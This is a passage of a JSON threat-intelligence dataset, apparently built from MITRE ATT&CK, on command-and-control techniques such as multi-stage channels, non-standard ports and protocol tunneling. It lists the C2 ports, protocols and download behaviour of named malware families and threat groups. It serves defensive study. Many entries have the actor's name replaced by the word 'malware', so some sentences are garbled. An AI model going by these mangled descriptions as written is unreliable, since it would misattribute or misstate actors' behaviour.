                "Description": "malware can download files from its C2 server, including the .NET DLLs, WoodySharpExecutor and WoodyPowerSession.[515]"
            },
            "S0341": {
                "ID": "S0341",
                "Name": "Xbash",
                "Description": "malware can download additional malicious files from its C2 server.[516]"
            },
            "S0653": {
                "ID": "S0653",
                "Name": "xCaon",
                "Description": "malware has a command to download files to the victim's machine.[83]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware downloads browser specific AppleScript modules using a constructed URL with the curl command, https://\" & domain & \"/agent/scripts/\" & moduleName & \".applescript.[517]"
            },
            "S0388": {
                "ID": "S0388",
                "Name": "YAHOYAH",
                "Description": "malware uses HTTP GET requests to download other files that are executed in memory.[518]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware obtains additional code to execute on the victim's machine, including the downloading of a secondary payload.[519][103][520][21]"
            },
            "S0230": {
                "ID": "S0230",
                "Name": "ZeroT",
                "Description": "malware can download additional payloads onto the victim.[521]"
            },
            "S0330": {
                "ID": "S0330",
                "Name": "Zeus Panda",
                "Description": "malware can download additional malware plug-in modules and execute them on the victim\u2019s machine.[522]"
            },
            "S1114": {
                "ID": "S1114",
                "Name": "ZIPLINE",
                "Description": "malware can download files to be saved on the compromised system.[512][91]"
            },
            "G0128": {
                "ID": "G0128",
                "Name": "ZIRCONIUM",
                "Description": "malware has used tools to download malicious files to compromised hosts.[523]"
            },
            "S0086": {
                "ID": "S0086",
                "Name": "ZLib",
                "Description": "malware has the ability to download files.[315]"
            },
            "S0672": {
                "ID": "S0672",
                "Name": "Zox",
                "Description": "malware can download files to a compromised machine.[234]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware has a command to transfer files from a remote host.[524]"
            },
            "S1013": {
                "ID": "S1013",
                "Name": "ZxxZ",
                "Description": "malware can download and execute additional files.[76]"
            }
        }
    },
    "T1104": {
        "ttp_name": "Multi-Stage Channels",
        "ttp_id": "T1104",
        "href": "/techniques/T1104",
        "tactic": "Command and Control",
        "description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.",
        "Procedure": {
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "An malware downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81.[1]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.[2]"
            },
            "S0031": {
                "ID": "S0031",
                "Name": "BACKSPACE",
                "Description": "malware attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs \"louder\" interactions with the malware.[3]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "The malware loader is used to download and execute the malware backdoor.[4][5]"
            },
            "S0069": {
                "ID": "S0069",
                "Name": "BLACKCOFFEE",
                "Description": "malware uses Microsoft\u2019s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims\u2019 machines.[6]"
            },
            "S0220": {
                "ID": "S0220",
                "Name": "Chaos",
                "Description": "After initial compromise, malware will download a second stage to establish a more permanent presence on the affected system.[7]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has used multi-stage malware components that inject later stages into separate processes.[8]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back.[9]"
            },
            "S1086": {
                "ID": "S1086",
                "Name": "Snip3",
                "Description": "malware can download and execute additional payloads and modules over separate communication channels.[10][11]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "Individual malware implants can use multiple communication channels based on one of four available modes of operation.[12]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware can download additional modules and malware capable of using separate C2 channels.[13]"
            }
        }
    },
    "T1095": {
        "ttp_name": "Non-Application Layer Protocol",
        "ttp_id": "T1095",
        "href": "/techniques/T1095",
        "tactic": "Command and Control",
        "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.[1] Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).ICMP communication between hosts is one example.[2] Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.[3] However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
        "Procedure": {
            "C0034": {
                "ID": "C0034",
                "Name": "2022 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team proxied C2 communications within a TLS-based tunnel.[4]"
            },
            "S0504": {
                "ID": "S0504",
                "Name": "Anchor",
                "Description": "malware has used ICMP in C2 communications.[5]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "An malware downloader establishes SOCKS5 connections for its initial C2.[6]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has used TCP in C2 communications.[7]"
            },
            "S1029": {
                "ID": "S1029",
                "Name": "AuTo Stealer",
                "Description": "malware can use TCP to communicate with command and control servers.[8]"
            },
            "G0135": {
                "ID": "G0135",
                "Name": "BackdoorDiplomacy",
                "Description": "malware has used EarthWorm for network tunneling with a SOCKS5 server and port transfer functionalities.[9]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware has a command built in to use a raw TCP socket.[10]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware has used raw sockets for network communication.[11]"
            },
            "G1002": {
                "ID": "G1002",
                "Name": "BITTER",
                "Description": "malware has used TCP for C2 communications.[12]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware has the ability to use TCP for external C2.[13]"
            },
            "S0043": {
                "ID": "S0043",
                "Name": "BUBBLEWRAP",
                "Description": "malware can communicate using SOCKS.[14]"
            },
            "C0021": {
                "ID": "C0021",
                "Name": "C0021",
                "Description": "During malware, the threat actors used TCP for some C2 communications.[15]"
            },
            "S0335": {
                "ID": "S0335",
                "Name": "Carbon",
                "Description": "malware uses TCP and UDP for C2.[16]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware has the ability to use TCP and UDP for communication.[17]"
            },
            "S1105": {
                "ID": "S1105",
                "Name": "COATHANGER",
                "Description": "malware uses ICMP for transmitting configuration information to and from its command and control server.[18]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can be configured to use TCP, ICMP, and UDP for C2 communications.[19][20]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware uses a custom TCP protocol for C2.[21][22]"
            },
            "S0498": {
                "ID": "S0498",
                "Name": "Cryptoistic",
                "Description": "malware can use TCP in communications with C2.[23]"
            },
            "C0029": {
                "ID": "C0029",
                "Name": "Cutting Edge",
                "Description": "During malware, threat actors used the Unix socket and a reverse TCP shell for C2 communications.[24]"
            },
            "S0021": {
                "ID": "S0021",
                "Name": "Derusbi",
                "Description": "malware binds to a raw socket on a random source port between 31800 and 31900 for C2.[25]"
            },
            "S0502": {
                "ID": "S0502",
                "Name": "Drovorub",
                "Description": "malware can use TCP to communicate between its agent and client modules.[26]"
            },
            "S0076": {
                "ID": "S0076",
                "Name": "FakeM",
                "Description": "Some variants of malware use SSL to communicate with C2 servers.[27]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "malware has used Metasploit Bind and Reverse TCP stagers.[28]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can communicate with C2 over TCP and UDP.[29]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware has the ability to use TCP and UDP in C2 communications.[30]"
            },
            "S0032": {
                "ID": "S0032",
                "Name": "gh0st RAT",
                "Description": "malware has used an encrypted protocol within TCP segments to communicate with the C2.[31]"
            },
            "G0125": {
                "ID": "G0125",
                "Name": "HAFNIUM",
                "Description": "malware has used TCP for C2.[32]"
            },
            "S0394": {
                "ID": "S0394",
                "Name": "HiddenWasp",
                "Description": "malware communicates with a simple network protocol over TCP.[33]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware has used TCP to download additional modules.[34]"
            },
            "S1051": {
                "ID": "S1051",
                "Name": "KEYPLUG",
                "Description": "malware can use TCP and KCP (KERN Communications Protocol) over UDP for C2 communication.[35]"
            },
            "S1121": {
                "ID": "S1121",
                "Name": "LITTLELAMB.WOOLTEA",
                "Description": "malware can function as a stand-alone backdoor communicating over the /tmp/clientsDownload.sock socket.[24]"
            },
            "S0582": {
                "ID": "S0582",
                "Name": "LookBack",
                "Description": "malware uses a custom binary protocol over sockets for C2 communications.[36]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware has used a custom JSON-based protocol for its C&C communications.[37]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can use raw TCP for C2.[38]"
            },
            "G1013": {
                "ID": "G1013",
                "Name": "Metador",
                "Description": "malware has used TCP for C2.[38]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can establish an indirect and raw TCP socket-based connection to the C2 server.[38][39]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has used raw TCP for C2.[40]"
            },
            "S0084": {
                "ID": "S0084",
                "Name": "Mis-Type",
                "Description": "malware network traffic can communicate over a raw socket.[41]"
            },
            "S0083": {
                "ID": "S0083",
                "Name": "Misdat",
                "Description": "malware network traffic communicates over a raw socket.[41]"
            },
            "S0149": {
                "ID": "S0149",
                "Name": "MoonWind",
                "Description": "malware completes network communication via raw sockets.[42]"
            },
            "S0699": {
                "ID": "S0699",
                "Name": "Mythic",
                "Description": "malware supports WebSocket and TCP-based C2 profiles.[43]"
            },
            "S0630": {
                "ID": "S0630",
                "Name": "Nebulae",
                "Description": "malware can use TCP in C2 communications.[44]"
            },
            "S0034": {
                "ID": "S0034",
                "Name": "NETEAGLE",
                "Description": "If malware does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number, malware will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.[45]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can use TCP in C2 communications.[46][47]"
            },
            "S1100": {
                "ID": "S1100",
                "Name": "Ninja",
                "Description": "malware can forward TCP packets between the C2 and a remote host.[48][49]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors used a custom protocol for command and control.[50]"
            },
            "S0352": {
                "ID": "S0352",
                "Name": "OSX_OCEANLOTUS.D",
                "Description": "malware has used a custom binary protocol over port 443 for C2 traffic.[51]"
            },
            "S0556": {
                "ID": "S0556",
                "Name": "Pay2Key",
                "Description": "malware has sent its public key to the C2 server over TCP.[52]"
            },
            "S0587": {
                "ID": "S0587",
                "Name": "Penquin",
                "Description": "The malware C2 mechanism is based on TCP and UDP packets.[53][54]"
            },
            "S0158": {
                "ID": "S0158",
                "Name": "PHOREAL",
                "Description": "malware communicates via ICMP for C2.[55]"
            },
            "S1031": {
                "ID": "S1031",
                "Name": "PingPull",
                "Description": "malware variants have the ability to communicate with C2 servers using ICMP or TCP.[56]"
            },
            "S0501": {
                "ID": "S0501",
                "Name": "PipeMon",
                "Description": "The malware communication module can use a custom protocol based on TLS over TCP.[57]"
            },
            "G0068": {
                "ID": "G0068",
                "Name": "PLATINUM",
                "Description": "malware has used the Intel\u00ae Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.[58]"
            },
            "S0013": {
                "ID": "S0013",
                "Name": "PlugX",
                "Description": "malware can be configured to use raw TCP or UDP for command and control.[59]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware has the ability use TCP to send or receive C2 packets.[60]"
            },
            "S0262": {
                "ID": "S0262",
                "Name": "QuasarRAT",
                "Description": "malware can use TCP for C2 communication.[61]"
            },
            "S1084": {
                "ID": "S1084",
                "Name": "QUIETEXIT",
                "Description": "malware can establish a TCP connection as part of its initial connection to the C2.[62]"
            },
            "S0629": {
                "ID": "S0629",
                "Name": "RainyDay",
                "Description": "malware can use TCP in C2 communications.[44]"
            },
            "S0055": {
                "ID": "S0055",
                "Name": "RARSTONE",
                "Description": "malware uses SSL to encrypt its communication with its C2 server.[63]"
            },
            "S0662": {
                "ID": "S0662",
                "Name": "RCSession",
                "Description": "malware has the ability to use TCP and UDP in C2 communications.[17][64]"
            },
            "S0172": {
                "ID": "S0172",
                "Name": "Reaver",
                "Description": "Some malware variants use raw TCP for C2.[65]"
            },
            "S0019": {
                "ID": "S0019",
                "Name": "Regin",
                "Description": "The malware malware platform can use ICMP to communicate between infected computers.[66]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware is capable of using ICMP, TCP, and UDP for C2.[67][68]"
            },
            "S1078": {
                "ID": "S1078",
                "Name": "RotaJakiro",
                "Description": "malware uses a custom binary protocol using a type, length, value format over TCP.[69]"
            },
            "S1073": {
                "ID": "S1073",
                "Name": "Royal",
                "Description": "malware establishes a TCP socket for C2 communication using the API WSASocketW.[70]"
            },
            "S1099": {
                "ID": "S1099",
                "Name": "Samurai",
                "Description": "malware can use a proxy module to forward TCP packets to external hosts.[48]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware can communicate with actor-controlled C2 servers by using a custom little-endian binary protocol.[71]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware has the ability to communicate with C2 with TCP over port 443.[72]"
            },
            "S0596": {
                "ID": "S0596",
                "Name": "ShadowPad",
                "Description": "malware has used UDP for C2 communications.[73]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware has the ability to use TCP sockets to send data and ICMP to ping the C2 server.[74][75]"
            },
            "S1049": {
                "ID": "S1049",
                "Name": "SUGARUSH",
                "Description": "malware has used TCP for C2.[76]"
            },
            "S0011": {
                "ID": "S0011",
                "Name": "Taidoor",
                "Description": "malware can use TCP for C2 communications.[77]"
            },
            "G1022": {
                "ID": "G1022",
                "Name": "ToddyCat",
                "Description": "malware has used a passive backdoor that receives commands with UDP packets.[49]"
            },
            "S0436": {
                "ID": "S0436",
                "Name": "TSCookie",
                "Description": "malware can use ICMP to receive information on the destination server.[78]"
            },
            "S0221": {
                "ID": "S0221",
                "Name": "Umbreon",
                "Description": "malware provides access to the system via SSH or any other protocol that uses PAM to authenticate.[79]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware can communicate through custom methodologies for UDP,  ICMP, and TCP that use distinct sessions to ride over the legitimate protocols.[80]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware can communicate with its C2 server via TCP over port 5200.[81]"
            },
            "S0515": {
                "ID": "S0515",
                "Name": "WellMail",
                "Description": "malware can use TCP for C2 communications.[82]"
            },
            "S0155": {
                "ID": "S0155",
                "Name": "WINDSHIELD",
                "Description": "malware C2 traffic can communicate via TCP raw sockets.[55]"
            },
            "S0430": {
                "ID": "S0430",
                "Name": "Winnti for Linux",
                "Description": "malware has used ICMP, custom TCP, and UDP in outbound communications.[83]"
            },
            "S0141": {
                "ID": "S0141",
                "Name": "Winnti for Windows",
                "Description": "malware can communicate using custom TCP.[84]"
            },
            "S1114": {
                "ID": "S1114",
                "Name": "ZIPLINE",
                "Description": "malware can communicate with C2 using a custom binary protocol.[85]"
            }
        }
    },
    "T1571": {
        "ttp_name": "Non-Standard Port",
        "ttp_id": "T1571",
        "href": "/techniques/T1571",
        "tactic": "Command and Control",
        "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088[1] or port 587[2] as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.[3]",
        "Procedure": {
            "G0099": {
                "ID": "G0099",
                "Name": "APT-C-36",
                "Description": "malware has used port 4050 for C2 communications.[4]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "An malware backdoor can use HTTP over a non-standard TCP port (e.g 14146) which is specified in the backdoor configuration.[5]"
            },
            "G0064": {
                "ID": "G0064",
                "Name": "APT33",
                "Description": "malware has used HTTP over TCP ports 808 and 880 for command and control.[1]"
            },
            "S0245": {
                "ID": "S0245",
                "Name": "BADCALL",
                "Description": "malware communicates on ports 443 and 8000 with a FakeTLS method.[6]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware binds and listens on port 1058 for HTTP traffic while also utilizing a FakeTLS method.[7]"
            },
            "S0574": {
                "ID": "S0574",
                "Name": "BendyBear",
                "Description": "malware has used a custom RC4 and XOR encrypted protocol over port 443 for C2.[8]"
            },
            "C0018": {
                "ID": "C0018",
                "Name": "C0018",
                "Description": "During malware, the threat actors opened a variety of ports, including ports 28035, 32467, 41578, and 46892, to establish RDP connections.[9]"
            },
            "C0032": {
                "ID": "C0032",
                "Name": "C0032",
                "Description": "During the malware campaign, TEMP.Veles used port-protocol mismatches on ports such as 443, 4444, 8531, and 50501 during C2.[10]"
            },
            "S0687": {
                "ID": "S0687",
                "Name": "Cyclops Blink",
                "Description": "malware can use non-standard ports for C2 not typically associated with HTTP or HTTPS traffic.[11]"
            },
            "G0105": {
                "ID": "G0105",
                "Name": "DarkVishnya",
                "Description": "malware used ports 5190 and 7900 for shellcode listeners, and 4444, 4445, 31337 for shellcode C2.[12]"
            },
            "S0021": {
                "ID": "S0021",
                "Name": "Derusbi",
                "Description": "malware has used unencrypted HTTP on port 443 for C2.[13]"
            },
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has used HTTP over ports such as 20, 22, 443, 7080, and 50000, in addition to using ports commonly associated with HTTP/S.[14][15]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during C2.[16]"
            },
            "S0493": {
                "ID": "S0493",
                "Name": "GoldenSpy",
                "Description": "malware has used HTTP over ports 9005 and 9006 for network traffic, 9002 for C2 requests, 33666 as a WebSocket, and 8090 to download files.[17]"
            },
            "S0237": {
                "ID": "S0237",
                "Name": "GravityRAT",
                "Description": "malware has used HTTP over a non-standard port, such as TCP port 46769.[18]"
            },
            "S0246": {
                "ID": "S0246",
                "Name": "HARDRAIN",
                "Description": "malware binds and listens on port 443 with a FakeTLS method.[19]"
            },
            "S0376": {
                "ID": "S0376",
                "Name": "HOPLIGHT",
                "Description": "malware has connected outbound over TCP port 443 with a FakeTLS method.[20]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "Some malware malware uses a list of ordered port numbers to choose a port for C2 traffic, creating port-protocol mismatches.[21][22]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware has used TCP port 5633 for C2 Communication.[23]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware malware has communicated with its C2 server over TCP ports 4443 and 10151 using HTTP.[24][25]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has communicated with hosts over raw TCP on port 9999.[26]"
            },
            "S0149": {
                "ID": "S0149",
                "Name": "MoonWind",
                "Description": "malware communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports.[27]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware has used port 1177 for HTTP C2 communications.[28]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, the threat actors used uncommon high ports for its backdoor C2, including ports 25667 and 47000.[29]"
            },
            "S0352": {
                "ID": "S0352",
                "Name": "OSX_OCEANLOTUS.D",
                "Description": "malware has used a custom binary protocol over TCP port 443 for C2.[30]"
            },
            "S1031": {
                "ID": "S1031",
                "Name": "PingPull",
                "Description": "malware can use HTTPS over port 8080 for C2.[31]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware used TLS to encrypt communications over port 143[32]"
            },
            "S0262": {
                "ID": "S0262",
                "Name": "QuasarRAT",
                "Description": "malware can use port 4782 on the compromised host for TCP callbacks.[33]"
            },
            "S0153": {
                "ID": "S0153",
                "Name": "RedLeaves",
                "Description": "malware can use HTTP over non-standard ports, such as 995, for C2.[34]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware's miner connects to a C2 server using port 51640.[35]"
            },
            "S1078": {
                "ID": "S1078",
                "Name": "RotaJakiro",
                "Description": "malware uses a custom binary protocol over TCP port 443.[36]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware used Port 44443 for its VNC module.[37]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has used port 6789 to accept connections on the group's SSH server.[38]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware has the ability to connect with actor-controlled C2 servers using a custom binary protocol over port 443.[39]"
            },
            "G0091": {
                "ID": "G0091",
                "Name": "Silence",
                "Description": "malware has used port 444 when sending data about the system from the client to the server.[40]"
            },
            "S0491": {
                "ID": "S0491",
                "Name": "StrongPity",
                "Description": "malware has used HTTPS over port 1402 in C2 communication.[41]"
            },
            "S1049": {
                "ID": "S1049",
                "Name": "SUGARUSH",
                "Description": "malware has used port 4585 for a TCP connection to its C2.[42]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "Some malware samples have used HTTP over ports 447 and 8082 for C2.[43][44][45] Newer versions of malware have been known to use a custom communication protocol which sends the data unencrypted over port 443. [46]"
            },
            "S0263": {
                "ID": "S0263",
                "Name": "TYPEFRAME",
                "Description": "malware has used ports 443, 8080, and 8443 with a FakeTLS method.[47]"
            },
            "S0515": {
                "ID": "S0515",
                "Name": "WellMail",
                "Description": "malware has been observed using TCP port 25, without using SMTP, to leverage an open port for secure command and control communications.[48][49]"
            },
            "G0090": {
                "ID": "G0090",
                "Name": "WIRTE",
                "Description": "malware has used HTTPS over ports 2083 and 2087 for C2.[50]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware can use ports 1985 and 1986 in HTTP/S communication.[51]"
            }
        }
    },
    "T1572": {
        "ttp_name": "Protocol Tunneling",
        "ttp_id": "T1572",
        "href": "/techniques/T1572",
        "tactic": "Command and Control",
        "description": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.[1] Protocol Tunneling may also be abused by adversaries during Dynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.[2] Adversaries may also leverage Protocol Tunneling in conjunction with Proxy and/or Protocol Impersonation to further conceal C2 communications and infrastructure.",
        "Procedure": {
            "C0034": {
                "ID": "C0034",
                "Name": "2022 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team deployed the GOGETTER tunneler software to establish a \"Yamux\" TLS-based C2 channel with an external server(s).[3]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware can use DNS over HTTPS for C2.[4][5]"
            },
            "C0027": {
                "ID": "C0027",
                "Name": "C0027",
                "Description": "During malware, Scattered Spider used SSH tunneling in targeted environments.[6]"
            },
            "C0032": {
                "ID": "C0032",
                "Name": "C0032",
                "Description": "During the malware campaign, TEMP.Veles used encrypted SSH-based PLINK tunnels to transfer tools and enable RDP connections throughout the environment.[7]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has encapsulated Cobalt Strike's C2 protocol in DNS and HTTPS.[8]"
            },
            "G1021": {
                "ID": "G1021",
                "Name": "Cinnamon Tempest",
                "Description": "malware has used the Iox and NPS proxy and tunneling tools in combination  create multiple connections through a single tunnel.[9]"
            },
            "G0080": {
                "ID": "G0080",
                "Name": "Cobalt Group",
                "Description": "malware has used the Plink utility to create SSH tunnels.[10][11][12]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.[13][14]"
            },
            "C0004": {
                "ID": "C0004",
                "Name": "CostaRicto",
                "Description": "During malware, the threat actors set up remote SSH tunneling into the victim's environment from a malicious domain.[15]"
            },
            "C0029": {
                "ID": "C0029",
                "Name": "Cutting Edge",
                "Description": "During malware, threat actors used Iodine to tunnel IPv4 traffic over DNS.[16]"
            },
            "S0687": {
                "ID": "S0687",
                "Name": "Cyclops Blink",
                "Description": "malware can use DNS over HTTPS (DoH) to resolve C2 nodes.[17]"
            },
            "S0038": {
                "ID": "S0038",
                "Name": "Duqu",
                "Description": "malware uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.[18]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has utilized web shells and Java tools for tunneling capabilities to and from compromised assets.[19]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "malware used the Plink command-line utility to create SSH tunnels to C2 servers.[20]"
            },
            "S0173": {
                "ID": "S0173",
                "Name": "FLIPSIDE",
                "Description": "malware uses RDP to tunnel traffic from a victim environment.[21]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has used protocol tunneling for communication and RDP activity on compromised hosts through the use of open source tools such as ngrok and custom tool SSHMinion.[22][23][24]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can connect to HTTP proxies via TCP to create a tunnel to C2.[25]"
            },
            "S1027": {
                "ID": "S1027",
                "Name": "Heyoka Backdoor",
                "Description": "malware can use spoofed DNS requests to create a bidirectional tunnel between a compromised host and its C2 servers.[26]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware attempts to perform an HTTP CONNECT via an internal proxy to establish a tunnel.[27]"
            },
            "S1020": {
                "ID": "S1020",
                "Name": "Kevin",
                "Description": "malware can use a custom protocol tunneled through DNS or HTTP.[28]"
            },
            "G0065": {
                "ID": "G0065",
                "Name": "Leviathan",
                "Description": "malware has used protocol tunneling to further conceal C2 communications and infrastructure.[29]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has used Plink to tunnel RDP over SSH.[30]"
            },
            "S1015": {
                "ID": "S1015",
                "Name": "Milan",
                "Description": "malware can use a custom protocol tunneled through DNS or HTTP.[28]"
            },
            "S0699": {
                "ID": "S0699",
                "Name": "Mythic",
                "Description": "malware can use SOCKS proxies to tunnel traffic through another protocol.[31]"
            },
            "S0508": {
                "ID": "S0508",
                "Name": "ngrok",
                "Description": "malware can tunnel RDP and other services securely over internet connections.[32][33][34][35]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used the Plink utility and other tools to create tunnels to C2 servers.[36][37][38]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "The malware proxy module can encapsulate SOCKS5 protocol within its own proxy protocol.[39]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware has the ability to communicate over custom communications methodologies that ride over common network protocols including raw TCP and UDP sockets, HTTP, SMTP, and DNS.[40]"
            }
        }
    },
    "T1090": {
        "ttp_name": "Proxy",
        "ttp_id": "T1090",
        "href": "/techniques/T1090",
        "subtechnique": {
            "001": {
                "name": "Internal Proxy",
                "href": "/techniques/T1090/001",
